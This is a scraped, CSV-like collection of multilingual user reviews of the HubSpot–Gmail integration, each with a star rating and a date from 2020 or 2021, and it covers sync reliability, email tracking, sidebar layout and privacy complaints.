Gmail is challenging when you have a long thread of emails under the same topic. There is no clear view to see what is the most updated and how threads on the email are being answered.,2 of 5,Dec 5 2021

Using HubSpot to track all your sales & customer emails is fantastic. Records get updated and you have a great information about your communications. The one major major issue is that you have to be really careful about tracking emails because you can end up with a pile of contacts in HubSpot that shouldn't be there. And worse you can end up with legal investor and other emails & documentation inside HubSpot for others to see. HubSpot needs to make it easier to filter out contacts that you don't want to track. It is possible to do this it just isn't easy.,2 of 5,Nov 29 2021

When creating a Meeting on HubSpot it not only added it to my Google Calendar but it shared it with my client's including all of my notes (that I thought would be private). To avoid this I just removed Google from HubSpot so that booking meetings on HubSpot does not email my clients. I will just manually add meetings to my Google Calendar.,1 of 5,Nov 16 2021

joe@me.net wants some insurance. I add him to HubSpot and can track my calls and emails to Joe. I will get other emails from underwriting@insuranceco.com and applicationreceived@insuranceco.com some of which I will want to attach to Joe or (Joes 100k policy Deal) (others of course from those same emails need to be attached to mary@me.net or susy@me.net) this requested feature has had good feedback in the HubSpot community boards but has not been implemented. Other than that you'll be hooked if you dip you feet in and use the product. It will help you track all those things spead between your calendar your email your sms and your call log all those things that are slipping between the cracks and losing you deals.,3 of 5,Nov 15 2021

This review is specifically for Gmail integration with SalesHub and not HubSpot overall. My work is done primarily within Gmail and you are not auto-alerted within Gmail in a user-friendly way. You have "open" SalesHub to see a list of relevant activities/opens/clicks etc.. instead of being able to see them in Gmail. Also the reporting features are very limited and you cannot "batch enroll" a list of leads/contacts. SalesHub caps at 50 contacts -- not very efficient... Compared to MixMax and SalesLoft -- SalesHub significantly falls short of being a sales-centric tool.,1 of 5,Oct 20 2021

In general HubSpot is a helpful tool for sales. However the Gmail integration could be more user-friendly especially (at least in my case) tagging email threads to specific projects. I'm having trouble locating the correct project. An auto-fill search feature that works is all I need. I have multiple projects per vendor/contact so that may lead to confusion.,3 of 5,Oct 18 2021

Gmail is a bit delayed in syncing with HubSpot ( when a lead is assigned). which might be critical when a direct demo is associated to one contact.,3 of 5,Oct 14 2021
Creo que el funcionamiento es bueno y el hecho de que esté ligado a HubSpot es genial pero creo que le añadiría funciones como por ejemplo el poder incluir "tarea" en el email o poder incluir las plantillas que tenemos en HubSpot desde gmail.

I get multiple notifications on my phone that someone opened my emails but in many cases I know I am getting the notifications late or incorrectly. I know this because for awhile it was sending me notifications that my boyfriend was opening a email repeatedly but he said he was not. And from clients I will get like 10 notifications that they opened an email and I doubt that they opened it 10 times. And I wish that when I sent an email directly from my gmail HubSpot would let me know if someone clicked any of the links. That would be helpful.,3 of 5,Oct 1 2021

Not satisfied at all. Frustrated with functionality. Stopped my outreaching altogether,1 of 5,Sep 29 2021
Grateful to have this integration but much could be improved. Would like to see more automatic triggering of syncing new email chains with contacts in HubSpot (not having to remember to BCC a random email address). I'd also like to see more control over which new contacts are created in HubSpot (i.e I don't want emails to non-leads to end up in HubSpot).,2 of 5,Sep 29 2021
O gmail está funcionando muito bem pra mim tanto com agendas quanto com o calendário. Com essa integração eu diminuo o meu tempo de manuseio em tarefas repetitivas e tenho menos perdas de oportunidades em agendamentos com a facilidade do link de reuniões - e o melhor sem custo para a minha empresa que ainda é pequena e precisa desse dinheiro em outros lugares.,5 of 5,Sep 29 2021

Funciona bien el seguimiento y el registro de los contactos. Sin embargo de un tiempo para acá cada vez que envío un correo desde Gmail la extensión de HubSpot hace que se copie mi correo (Del cual estoy enviando) en cco y llega como copia a la bandeja de entrada lo cual es sumamente desesperante. Intenté desintalar la extención y sin ella funciona normal lo que quiere decir que es un problema de la extención de HubSpot.

Using HubSpot with Gmail is a deterrent to our business efficiency. It would behoove HubSpot to seek closer integration with other email platforms to see greater adoption from teams that must prioritize task allocation and operations through integrated communications over marketing and sales.,2 of 5,Sep 23 2021

Tricky to manage Tickets by using emails. easy to track emails by using HubSpot plugin,3 of 5,Sep 10 2021
This is one of the better Gmail integrations out there. All emails can be tagged if you want to track them if yes the contact gets created in HubSpot existing contacts the mail is linked as a communication history. You can tag the email to be linked to contact deal and/or organization. Amazing tool to keep track of communication history.,5 of 5,Sep 10 2021
I don't know how I would function without this integration. I've used both gmail and outlook and I would say that the outlook plugin is more useful mainly because I'm able to easily schedule new tasks while in gmail. There is some room for improvement however.,4 of 5,Sep 9 2021

It often is a company process to ensure everyone is making their correspondence visible to the rest of the company. In previous years most CRMs would allow this by bcc'ing a set address. This wasn't ideal  people forget these rules so the gmail integration makes this foolproof,5 of 5,Sep 7 2021

It makes it very efficient to be able to work directly from HubSpot or from Gmail and switch as needed while missing nothing in the paper trail.,5 of 5,Sep 2 2021
Google Workspaces works just fine. But I don't like the HubSpot integration all that well because I feel that it relies on too much additional plugins. For example if I want good email tracking I have to use a Chrome extension to get the job done or send all emails from within HubSpot. Otherwise I have to manually BCC my HubSpot address each time. That is not the ideal solution for me because I prefer using Firefox and I don't want to have two tabs open for redundancy. Furthermore I do not receive all mail in HubSpot. Let me actually integrate HubSpot with Gmail without jumping through so many hoops.,3 of 5,Sep 2 2021

The best I can say is that it's minimally functional. Essentially consider it mostly a "view only" window into HubSpot which has clearly decided it wants you to "live in" the HubSpot web app all day rather than work out of Gmail. For context we migrated from Copper CRM to take advantage of HubSpot's complete suite--CRM sales hub marketing hub customer service hub etc. Copper can't match the functionality of having everything in one place. That said it's shocking to me that a vastly smaller company by comparison could be light years beyond HubSpot when it comes to Gmail integration. Our sales team has always worked out of the inbox. Copper allowed them to do that because there wasn't any day-to-day deal/opp management functionality that existed in the web app that didn't exist in the Chrome extension. This allowed our sales team to quickly and easily manage every aspect of a related contact company and deal/opp record without ever leaving Gmail. It was such a good experience that I simply presumed a company of HubSpot's size and cost would be at least as good if not better. I was wrong.,2 of 5,Jul 21 2021

Very useful to have all my business email connected to HS so I can track the record of all my communication and have my teammates aware of what's going on,5 of 5,Jul 14 2021
The integration works very well. There's one improvement I'd like to see. Currently it tracks every communication including ones with my coworkers. It would be nice to have a way to tell the tool to ignore certain domains (not just individual users).,5 of 5,Jul 13 2021
We really need inbound emails that we do not reply to to be able to be logged in HS. It seems odd that this is an issue!,3 of 5,Jul 13 2021

The two completely different HubSpot integrations for shared accounts vs individual accounts confuses the team and limits our ability to track all emails well.

I can't believe how much I can do from Gmail that syncs directly into the HubSpot CRM. It is easy to set-up tells me when clients open their emails logs my emails directly in the CRM under the correct contacts companies and deal records. Not only that but I can create tasks and deals straight from Gmail to reduce the need to jump back and forth which helps me streamline my day. I have been using this integration for nearly 6 years now at multiple companies and it just keeps getting better and better.,5 of 5,Jul 2 2021

The integration with gmail is good but too encompassing. When I connected gmail for my 1 work account HubSpot thought it was a good idea to also include my other work account. So now all of my email from two different companies goes into the one...not good for multiple reasons. Trying to separate them is virtually impossible now because the documentation is lacking.,2 of 5,Jun 22 2021

I like being integrated. What I don't like is the HubSpot ribbon on the side taking up so much space. It forces me to scroll EVERY email I get greatly reducing my positivity about HubSpot. If that could be smaller/eliminated etc - I'd feel better about HubSpot. If I'm forced to chose one or the other - HubSpot will not win.,2 of 5,Jun 16 2021

Great tool allowing email correspondence with easy search feature. Mails can be easily sorted.,4 of 5,Jun 15 2021
Gmail is excellent. The HubSpot sidebar that opens with every message and cannot be persistently closed (kept closed) ruins the UX and robs users of 15-25% of available screen space. Unfortunately we have to keep the plugin installed for tracking/logging but I use an ad blocker to block the panel so all I get is a big waste of white space.,2 of 5,Jun 14 2021

HubSpot integrated with Gmail is exceptional - because all the same messaging templates and snippets stored in HubSpot are one-click accessible to pull into your Gmail messaging. And having HubSpot Log 'n Track all my Emails and activities to each of my contacts - no more searches trying to find my last emails to particular contacts - I just click the Contact in HubSpot and it organizes and stores all my Gmail activity in my Contacts account.

It's a decent integration and the sidebar panel for clients is nice when you're viewing an email. The tracking/log controls are easy and the snippet/template stuff is great - we use it often. But coming from Insightly the one BIG omission is a simple click to save against a HubSpot record. Insightly allowed you to click 'save' and search for a contact opportunity project etc and save the email against it. HubSpot still requires the 'forward to an email' thing and doesn't really let you choose how it's saved.,4 of 5,Jun 2 2021

I only use Gmail outside of HubSpot. There are pros and cons. My Gmail is integrated with HubSpot but I do not use it. I am a true startup and Army of one.

It make my emails look cheap....which is not helpful to a startup.,1 of 5,Jun 1 2021
Very Poor. When sending email Campaigns it only recognises one email not the bulk 100. When targetting thousands of customers this needs to be recorded.

The pop out on the right of the page needs to have a stop function it opens on every new email and takes up too much of the screen. I understand the benefits of it but it would be better to have the choice to use it or not. It takes up too much space on the page especially if you have the email page layout in two columns.,2 of 5,May 21 2021

Es läuft alles super gut und bin Super Zufrieden mit HubSpot +Gmail. Kann es nur Weiterempfehlen.,5 of 5,May 21 2021
HubSpot's GMail integration is pretty seamless and makes it incredibly convenient to log/track emails. It's particularly helpful when sending proposals to potential clients so we can see in real time when they are opening and know when to do appropriate follow-up.,4 of 5,May 20 2021

Gmail ha sido una herramienta fundamental para el negocio pero la integración entre ambas plataformas deja mucho que desear. No es sencilla y en últimas resulta mejor buscar y enviar todo desde el mismo gmail y no HubSpot,3 of 5,May 19 2021
Works great except for those few times the emails don't get integrated. It allows me to send emails quicker without having to leave the platform.,3 of 5,May 19 2021
Muy bien se gestionan mejor lo contactos y las conversaciones y es muy fácil de usar,4 of 5,May 19 2021
As you can expect from an email service like Yahoo Gmail you can use it in Outlook or standalone mine is integrated into the company structure,4 of 5,May 19 2021
Excellent! It has made me well-organized! I feel confident stress-free & relaxed using it.,5 of 5,May 19 2021
Es una buena integración aunque en pocasiones se desconecta o por alguna razon no se vuelcan los emails al 100%  no es facil filtrar aquellos emails que no deben volcarse pero esto depende mas de HubSpot que de Gmails.,3 of 5,May 19 2021
La integración con HubSpot es muy básica y algunos correos no migran. (aun con la extensión prendida),2 of 5,May 18 2021

Esta funcionando de maravilla ya que me ha dado los soportes necesarios para interactuar con mis clientes.,5 of 5,Dec 21 2020
Works great with HubSpot. Can email from both gmail and HubSpot. The emails auto-log to the lead's profile in HubSpot and I can see if my prospect opened or clicked on any links. I can also use the templates sequences documents and my calendar links directly in Gmail.,5 of 5,Dec 21 2020
Basic options don't work. Some options like having your signature in your email have been disabled. So you cant have your signature. Which is kind of important when sending prospects emails. Not impressed at all,1 of 5,Dec 18 2020
It works fine when it stays logged in. Every other day I have to log back into the HubSpot tool.,2 of 5,Dec 17 2020
I have 3 different businesses that all use Gmail and I figured that since I have each one connected (in HubSpot) to a HubSpot account using that email address that it wouldn't send email from one account to another but it does. It doesn't matter what account you link in HubSpot if you are logged in to a specific HubSpot account (which it forces when you are in Gmail) then all other Gmail accounts open that have the plugin will send emails to that HubSpot account. This is very bad for me.,2 of 5,Dec 17 2020
Not well switching hosting to windows within the next quarter. For now we are not using the integration to its full potential.,3 of 5,Dec 17 2020

Es simplemente la mejor herramienta que hemos encontrado para gestionar los correos corporativos de la empresa,5 of 5,Dec 16 2020
I'd looked for a solution that allowed all the emails sent and received to a particular client to be stored in a neat and easy way along with notes call logs meetings etc to keep on track of everything. Gmail integrates with HubSpot seamlessly it even handles aliases pretty well which I wasn't expecting.,5 of 5,Dec 16 2020
Gmail integration is wonderful as I can see real time alerts regarding prospects opening and viewing emails sent. It is also adds ease of attaching marketing material to send to prospects.,5 of 5,Dec 16 2020
Muy bien me brinda una experiencia bastante agradable conectando funcionalidades de HubSpot en mi Gmail.,5 of 5,Dec 16 2020
great helps to track the emails easier and faster to log the customers' information in the HubSpot,5 of 5,Dec 16 2020
It's a great tool and one that we find very helpful both for ourselves and for our clients. However we run into issues with users who have multiple HubSpot accounts and wish to log different emails to different accounts. It would be great if there was a way within both gmail and outlook for you to toggle/select which HubSpot account you want to log each email to.,3 of 5,Dec 16 2020
Me es útil y práctico en todo lo que hago día a día puedo ver todo lo relacionado con mis actividades,4 of 5,Dec 15 2020

Perfectly we use it as our communication channel within the company and it works perfectly. As well as our communication channel with outbound leads we want to prospect and to evangelize with our solution. It has been really useful and we have managed to capture the interest of leading companies in different industries.,4 of 5,Dec 14 2020
Great additional to be able to track all incoming/outgoing emails for sales leads. It also automatically adds new contacts which is a huge time saver.,5 of 5,Dec 14 2020
Gmail is awesome. Cannot do without it! It stores my documents for any time referencing and is user friendly.,5 of 5,Dec 13 2020
Our company is having explosive growth. I love being able to see everything that I've sent my love having the templates I love Tracking my emails love the signature part is really nothing that I don't like about Gmail except that it doesn't have G mass and I love it together with hub spot so perfect I which hotspot was a little cheaper let the but it,5 of 5,Dec 12 2020
PARA MI HA SIDO UNA BUENA OPCIÓN CONTAR CON GMAIL POR QUE DE MI CORREO CORPORATIVO COPIO A ESTE Y LA INFORMACIÓN QUEDA RESPALDADA.,5 of 5,Dec 11 2020
Love the plug-in but it needs to support creating new tickets too. Currently it only allows linking to existing tickets. There should be an option to create a new ticket as well that is linked to the email and the contact.,5 of 5,Dec 11 2020
In my opinion there could be more documentation related to the usage of the extension as it has excellent features and functions that can be discovered by using the tool but not from a document outlining them for people who have never had the chance to experiment with it.,5 of 5,Dec 10 2020
Gmail is great. It is a much better solution for email then competitors that rely on POP or IMAP or Outlook/Exchange. The big problem with the integration of HS with Gmail is that there is still a lot of manual effort to bring data into HS. This isn't state of the art compared to other CRM tools on the market.,3 of 5,Dec 10 2020
Gmail isolated is very good and the HubSpot tracking is less advanced when it comes to overview of tracking per email in G-mail/HubSpot extension and total view of campaigns etc in HubSpot - have a look at Mixmax for improvement suggestions ;-). I would strongly recommend to allow to import stand-alone mailing list from .CSV in HubSpot sequences.,3 of 5,Dec 10 2020
Really helpful and saving time. All organised well in one place and the mail tracking works really good,5 of 5,Dec 10 2020

My team is able to see contact activities and reach out or not to specific contact according to my previous messages. Moreover the widget for Gmail helps me speed up the writing process by selecting snippets and templates directly into Gmail.,5 of 5,Dec 7 2020
super tous les mails sont automatiquement envoyés sur HubSpot à partir de ma messagerie,5 of 5,Dec 2 2020
it's working great easy to use and working as I intended. Only that it's actually add-on is a bit off-putting but not terrible,4 of 5,Nov 26 2020
I would really like the HubSpot extension to work but had to disable until the problem can be overcome. I use the mail search function a lot.,2 of 5,Oct 9 2020
1) I would like HubSpot to retire the legacy Chrome Extension in favor of a Google G-Suite Gmail Addon. The extension sits on top of the native UI overlaying other components and never works quite right frequently causing issues when trying to send messages through Gmail. 2) When you publish the addon please make sure it has the ability to create tickets. One use-case for this would be to click on a HubSpot addon in Gmail to forward messages that were sent to individual address (instead of the support address) and this functionality would allow us to create a ticket on behalf of the original sender.,3 of 5,Sep 26 2020
There is one big problem with Gmail-HubSpot arrangement- It is not possible to sync contacts. It would be very convenient to have all the contacts I add to HubSpot populate in Gmail because it is very annoying to have contacts in two different places.,3 of 5,Aug 3 2020
Gmail seems to work well. HubSpot email tracking doesn't work that well. email tracking within HubSpot is atrocious as it doesn't handle contacts tied to multiple deals. it simply guesses and is a huge time suck to clean up deals that have multiple contacts or contacts with multiple deals associated with him/her. This takes so much time to clean this up and get it sorted out.,2 of 5,Jul 15 2020
The HubSpot Gmail integration does not meet my expectations at all. This is the capability I like least about HubSpot and the only thing I really miss about our previous CRM system.,2 of 5,Jul 14 2020
And even the non-techies like me can get it working so that emails log to the HubSpot CRM easily.,5 of 5,Jul 14 2020
Working fine but HubSpot integration is very intermittent. Sometimes works mostly not. Also the way HubSpot displays email threads is so annoying it’s almost a showstopper. You click on an email to some more and it leaps off in an entirely disorienting way somehow positioning the thread upside down so you have no idea what order to read anything in. It sucks,2 of 5,Jul 13 2020
yet to see its benefits figuring out how to leverage the integration and with time we hope to know more about it.,5 of 5,Jul 13 2020
Logging/Tracking Gmail activity as a sales rep goes saves the rep time and provide "activity" visibility across our company.,4 of 5,Jul 13 2020
The HubSpot-Gmail integration makes it easy to engage and serve clients. All the email functions (snippets templates meetings and sequences) are available in the familiar Gmail interface.,5 of 5,Jul 13 2020
If I have HubSpot integration turned on with my business account and accessed my personal account any email i send from the personal account the HubSpot plugin picks it up and logs it in HubSpot or sends it to the default email address of the business. This is a major security flaw.,1 of 5,Jul 13 2020
